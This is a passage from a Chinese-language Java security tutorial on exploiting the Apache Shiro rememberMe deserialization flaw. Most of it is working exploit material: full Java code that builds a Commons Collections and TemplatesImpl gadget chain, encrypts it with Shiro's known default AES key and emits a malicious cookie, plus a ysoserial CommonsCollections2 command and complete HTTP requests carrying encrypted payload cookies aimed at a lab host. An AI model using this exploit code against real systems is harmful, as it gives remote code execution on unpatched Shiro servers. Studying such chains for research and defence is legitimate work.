![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/14be08df-6086-405f-998f-0130fa78c57e/17.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=23e63762ce1ec6cb1368adfb1d3e6919e09efa3bce3f78633280e57b5895ade9&X-Amz-SignedHeaders=host&x-id=GetObject)

## CommonsCollections4Shiro

如上通过 JRMP 进行利用的方式，不仅利用起来麻烦，而且还依赖服务器出网条件，一点都不够优雅。

根据如上的分析，得出当出现 Transformer 数组时，会在本地加载不到相应的类，那么只需避免使用到 Transformer 数组不就可以解决这个问题嘛。

根据先前已学的知识，对 LazyMap 版 CommonsCollections1 链与 CommonsCollections6 链中用到的 TiedMapEntry 以及 CommonsBeanutils1 链中所用到的 TemplatesImpl 三者进行结合，最终构造出如下利用代码。由于利用代码能够直接对反序列化数据进行加密编码，所以需要先导入 shiro-core 和 slf4j 等依赖。

```xml
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.2.4</version>
</dependency>
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-api</artifactId>
    <version>1.7.5</version>
</dependency>
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-simple</artifactId>
    <version>1.7.5</version>
</dependency>
```

```java
package com.javasec.shiro;

import com.javasec.cc.EvilTemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ShiroAttackWithCC {
    public static void main(String[] args) throws Exception {

        ByteSource ciphertext = new AesCipherService().encrypt(
                CC4Shiro(), Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==")
        );

        System.out.println("Cookie: rememberMe=" + ciphertext.toString());
    }

    public static byte[] CC4Shiro() throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_name", "T");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()
        });

        Transformer transformer = new InvokerTransformer("toString", null, null);

        Map lazyMap = LazyMap.decorate(new HashMap(), transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, obj);

        Map hashMap = new HashMap();
        hashMap.put(entry, "v");

        setFieldValue(transformer, "iMethodName", "newTransformer");

        lazyMap.remove(obj);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();

        return barr.toByteArray();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

发送如下 HTTP 请求，即可弹出计算器。

```text
GET / HTTP/1.1
Host: 10.11.34.121:8888
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: rememberMe=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
Connection: close


```

## CommonsCollections2

当 Commons Collections 版本为 4.0，可以直接利用 ysoserial 工具中的 CommonsCollections2 链。

```shell
java -jar ysoserial-all.jar CommonsCollections2 "open -a Calculator" > cc2.ser
```

依旧使用如上 Python 脚本对 cc2.ser 进行加密与编码，然后构造如下请求，并发送。

```text
GET / HTTP/1.1
Host: 10.11.34.121:8888
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: rememberMe=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
Connection: close


```

最终成功弹出计算器。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c7b014ce-9feb-4696-b8dc-ba6851405ae2/18.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050159Z&X-Amz-Expires=3600&X-Amz-Signature=c225a0d7d1a5a826a408e7e1e951fb6dca51ed3cf10f4d267acdb695d0eb7cd1&X-Amz-SignedHeaders=host&x-id=GetObject)

CommonsCollections2 与 CommonsBeanutils1 很类似，Kick-off 与 Sink 都相同，二者的不同点在于中间 Gadget 链的不同，CommonsCollections2 通过在 org.apache.commons.collections4.comparators.TransformingComparator#compare 方法中触发 org.apache.commons.collections4.functors.InvokerTransformer#transform 方法的调用，最终在 InvokerTransformer#transform 方法中通过反射调用 TemplatesImpl 执行任意恶意字节码。

上图中抛出的报错日志也详细地展示了 CommonsCollections2 链的调用栈。

## 参考

- [https://xz.aliyun.com/t/7950](https://xz.aliyun.com/t/7950)
- [https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java)
- [https://github.com/phith0n/JavaThings/](https://github.com/phith0n/JavaThings/)
